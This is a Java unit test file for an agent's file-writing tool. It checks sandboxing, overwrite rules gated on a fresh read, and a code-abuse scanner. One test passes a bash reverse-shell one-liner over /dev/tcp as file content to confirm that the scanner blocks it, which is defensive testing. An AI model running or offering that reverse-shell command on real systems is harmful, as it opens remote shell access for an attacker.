package com.navneet.executespec.tool;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.mock;

import java.nio.file.Files;
import java.nio.file.Path;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.node.ObjectNode;
import com.navneet.executespec.security.CodeAbuseScanner;
import com.navneet.executespec.sse.SseBroadcaster;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

@DisplayName("WriteFileTool")
class WriteFileToolTest {

  @TempDir Path workspace;

  private final ObjectMapper om = new ObjectMapper();
  private WriteFileTool tool;
  private ReadFileStateStore readState;
  private ExecutionContext ctx;

  @BeforeEach
  void setUp() {
    readState = new ReadFileStateStore();
    tool =
        new WriteFileTool(
            new FileSandboxPolicy(),
            new CodeAbuseScanner(),
            mock(SseBroadcaster.class),
            readState,
            null);
    ctx = new ExecutionContext("run-1", "T1", workspace);
  }

  private JsonNode args(String path, String content) {
    ObjectNode node = om.createObjectNode();
    node.put("path", path);
    node.put("content", content);
    return node;
  }

  @Test
  void writesCleanNewFile() throws Exception {
    ToolResult result = tool.execute(args("src/App.java", "class App {}\n"), ctx);

    assertThat(result).isInstanceOf(ToolResult.Ok.class);
    assertThat(Files.readString(workspace.resolve("src/App.java"))).isEqualTo("class App {}\n");
  }

  // ---- harness-resolution T4: overwrite=true gated on read-recency ----

  private JsonNode argsOverwrite(String path, String content) {
    ObjectNode node = (ObjectNode) args(path, content);
    node.put("overwrite", true);
    return node;
  }

  @Test
  void refusesExistingFileWithoutOverwrite() throws Exception {
    Files.writeString(workspace.resolve("a.txt"), "v1");
    ToolResult result = tool.execute(args("a.txt", "v2"), ctx);
    assertThat(result).isInstanceOf(ToolResult.Err.class);
    assertThat(((ToolResult.Err) result).kind()).isEqualTo(ToolResult.ErrorKind.ALREADY_EXISTS);
    assertThat(((ToolResult.Err) result).message()).contains("overwrite=true");
    assertThat(Files.readString(workspace.resolve("a.txt"))).isEqualTo("v1");
  }

  @Test
  void overwriteRefusedWithoutPriorRead() throws Exception {
    Files.writeString(workspace.resolve("a.txt"), "v1");
    ToolResult result = tool.execute(argsOverwrite("a.txt", "v2"), ctx);
    assertThat(result).isInstanceOf(ToolResult.Err.class);
    assertThat(((ToolResult.Err) result).kind()).isEqualTo(ToolResult.ErrorKind.STALE_READ);
    assertThat(Files.readString(workspace.resolve("a.txt"))).isEqualTo("v1");
  }

  @Test
  void overwriteSucceedsAfterFreshRead() throws Exception {
    java.nio.file.Path f = workspace.resolve("a.txt");
    Files.writeString(f, "v1");
    readState.recordRead(ctx.runId(), PathSafety.safeResolve(workspace, "a.txt"), "v1");
    ToolResult result = tool.execute(argsOverwrite("a.txt", "v2"), ctx);
    assertThat(result).isInstanceOf(ToolResult.Ok.class);
    assertThat(Files.readString(f)).isEqualTo("v2");
  }

  @Test
  void overwriteRefusedWhenDiskDriftedSinceRead() throws Exception {
    java.nio.file.Path f = workspace.resolve("a.txt");
    Files.writeString(f, "v1");
    readState.recordRead(ctx.runId(), PathSafety.safeResolve(workspace, "a.txt"), "v1");
    Files.writeString(f, "v1-changed-behind-your-back");
    ToolResult result = tool.execute(argsOverwrite("a.txt", "v2"), ctx);
    assertThat(result).isInstanceOf(ToolResult.Err.class);
    assertThat(((ToolResult.Err) result).kind()).isEqualTo(ToolResult.ErrorKind.STALE_READ);
    assertThat(Files.readString(f)).isEqualTo("v1-changed-behind-your-back");
  }

  @Test
  void codeAbuseScanBlocksMaliciousNewFile() {
    ToolResult result =
        tool.execute(args("exploit.sh", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n"), ctx);

    assertThat(result).isInstanceOf(ToolResult.Err.class);
    assertThat(((ToolResult.Err) result).kind()).isEqualTo(ToolResult.ErrorKind.FORBIDDEN);
    assertThat(Files.exists(workspace.resolve("exploit.sh"))).isFalse();
  }
}
